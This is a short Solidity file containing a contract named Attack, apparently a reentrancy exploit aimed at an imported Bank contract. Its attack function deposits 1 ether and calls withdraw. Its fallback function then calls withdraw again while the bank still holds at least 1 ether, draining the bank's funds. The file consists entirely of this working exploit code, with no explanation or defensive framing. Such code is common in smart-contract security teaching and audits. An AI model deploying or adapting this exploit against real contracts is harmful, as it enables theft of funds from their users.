//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "./Bank.sol";

contract Attack {

    Bank public bank;

    constructor(address _bank ){
        bank = Bank(_bank);
    }

    fallback() external payable{
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }

    }

    function attack() external payable {
        require(msg.value >= 1 ether );
        bank.deposit{value: 1 ether}();
        bank.withdraw();

    }



}